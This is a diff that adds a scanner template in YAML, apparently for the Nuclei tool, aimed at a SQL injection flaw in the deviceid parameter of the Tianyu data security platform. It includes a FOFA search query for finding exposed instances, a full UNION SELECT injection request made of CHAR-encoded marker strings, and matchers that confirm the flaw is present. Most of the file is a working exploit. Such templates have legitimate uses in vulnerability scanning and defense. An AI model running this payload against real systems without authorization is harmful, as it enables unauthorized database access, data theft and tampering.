@@ -1,0 +1,29 @@
+id: tianyu-data-security-deviceid-sql
+
+info:
+  name: "天喻数据安全平台 deviceid 接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="数据安全" && body="天喻"
+      天喻数据安全平台在 deviceid 接口处理逻辑中存在SQL注入缺陷。攻击者可通过构造恶意输入触发SQL注入，从而执行未经授权的数据库操作，如数据篡改、信息泄露或服务中断，进而影响系统完整性和可用性。
+  tags: 天喻数据安全平台
+
+http:
+- raw:
+  - |
+    GET /handler/DownLoad.ashx?operatetype=downloadsetupdll&deviceid=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%2880%29%2BCHAR%28100%29%2BCHAR%2873%29%2BCHAR%28122%29%2BCHAR%2878%29%2BCHAR%2882%29%2BCHAR%2886%29%2BCHAR%28103%29%2BCHAR%2875%29%2BCHAR%2888%29%2BCHAR%28109%29%2BCHAR%2874%29%2BCHAR%28101%29%2BCHAR%2868%29%2BCHAR%28111%29%2BCHAR%2889%29%2BCHAR%28111%29%2BCHAR%28114%29%2BCHAR%28114%29%2BCHAR%2869%29%2BCHAR%2886%29%2BCHAR%2869%29%2BCHAR%28122%29%2BCHAR%2881%29%2BCHAR%2882%29%2BCHAR%2883%29%2BCHAR%2868%29%2BCHAR%28110%29%2BCHAR%28114%29%2BCHAR%28103%29%2BCHAR%28119%29%2BCHAR%2881%29%2BCHAR%2899%29%2BCHAR%28120%29%2BCHAR%28110%29%2BCHAR%28104%29%2BCHAR%2872%29%2BCHAR%2885%29%2BCHAR%28111%29%2BCHAR%2868%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+FVCt HTTP/1.1
+    Host: {{Hostname}}
+    Upgrade-Insecure-Requests: 1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Priority: u=1
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'PdIzNRVgKXmJeDoYorrEVEzQR'
